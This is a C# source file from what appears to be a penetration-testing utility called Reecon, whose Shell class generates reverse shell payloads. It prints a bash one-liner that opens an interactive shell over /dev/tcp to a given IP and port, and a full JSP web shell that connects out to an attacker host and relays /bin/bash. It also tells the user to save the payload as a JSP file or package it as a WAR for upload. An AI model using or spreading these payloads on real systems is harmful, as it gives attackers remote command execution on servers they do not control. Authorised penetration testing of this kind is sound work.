using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Reecon
{
    class Shell
    {
        public static void GetInfo(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Shell Usage: reecon --shell shellType [IP Port]");
                Console.WriteLine("Types: bash, jsp, war");
                return;
            }
            string shellType = args[1];
            string ip = "10.0.0.1";
            string port = "1234";
            if (args.Length == 4)
            {
                ip = args[2];
                port = args[3];
            }
            if (shellType == "bash")
            {
                Console.WriteLine("Bash Shell");
                Console.WriteLine("----------");
                Console.WriteLine(bashShell(ip, port));
            }
            else if (shellType == "jsp")
            {
                Console.WriteLine("JSP Shell");
                Console.WriteLine("---------");
                Console.WriteLine(jspShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as file.jsp");
            }
            else if (shellType == "war")
            {
                Console.WriteLine("WAR Shell");
                Console.WriteLine("---------");
                Console.WriteLine(jspShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as file.jsp");
                Console.WriteLine("--> zip file.war file.jsp");
            }
            else
            {
                Console.WriteLine("Unknown Shell: " + shellType);
            }
        }

        private static string bashShell(string ip, string port)
        {
            // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
            return "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
        }

        public static string jspShell(string ip, string port)
        {
            return "<%@page import=\"java.lang.* \"%><%@page import=\"java.util.* \"%><%@page import=\"java.io.* \"%><%@page import=\"java.net.* \"%><% class StreamConnector extends Thread { InputStream is; OutputStream os; StreamConnector( InputStream is, OutputStream os ) { this.is = is; this.os = os; } public void run() { BufferedReader in = null; BufferedWriter out = null; try { in = new BufferedReader( new InputStreamReader( this.is ) ); out = new BufferedWriter( new OutputStreamWriter( this.os ) ); char buffer[] = new char[8192]; int length; while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) { out.write( buffer, 0, length ); out.flush(); } } catch( Exception e ){} try { if( in != null ) in.close(); if( out != null ) out.close(); } catch( Exception e ){} } } try {" + Environment.NewLine
                    + "Socket socket = new Socket(\"" + ip + "\", " + port + ");" + Environment.NewLine
                    + "Process process = Runtime.getRuntime().exec(\"/bin/bash\");" + Environment.NewLine
                    + "(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start(); (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();} catch(Exception e ) {} %>";
        }
    }
}
